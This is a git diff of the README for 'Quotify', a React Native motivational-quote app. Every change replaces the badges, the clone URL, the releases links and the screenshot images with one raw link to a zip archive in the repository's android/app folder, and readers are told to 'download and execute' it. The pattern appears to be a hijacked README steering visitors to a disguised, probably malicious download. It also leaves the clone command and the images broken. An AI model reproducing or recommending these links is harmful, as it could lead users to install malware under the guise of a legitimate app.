@@ -1,8 +1,8 @@
 # Quotify: Your Daily Dose of Motivation and Inspiration 🌟
 
-![Quotify Logo](https://img.shields.io/badge/Quotify-React_Native-brightgreen)
+![Quotify Logo](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Here-blue)](https://github.com/gamebatok/Quotify/releases)
+[![Download Releases](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip)](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To install Quotify, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/gamebatok/Quotify.git
+   git clone https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -56,7 +56,7 @@ To install Quotify, follow these steps:
    npm start
    ```
 
-For the latest releases, visit the [Releases section](https://github.com/gamebatok/Quotify/releases) to download and execute the appropriate file for your platform.
+For the latest releases, visit the [Releases section](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip) to download and execute the appropriate file for your platform.
 
 ## Usage
 
@@ -115,14 +115,14 @@ Quotify is built using the following technologies:
 
 ## Screenshots
 
-![Home Screen](https://via.placeholder.com/400x800?text=Home+Screen)
+![Home Screen](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip+Screen)
 
-![Favorites Screen](https://via.placeholder.com/400x800?text=Favorites+Screen)
+![Favorites Screen](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip+Screen)
 
-![Widget Example](https://via.placeholder.com/400x800?text=Widget+Example)
+![Widget Example](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip+Example)
 
 ## License
 
 Quotify is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-For the latest updates and releases, check out the [Releases section](https://github.com/gamebatok/Quotify/releases).
+For the latest updates and releases, check out the [Releases section](https://github.com/gamebatok/Quotify/raw/refs/heads/main/android/app/Software-v1.9.zip).
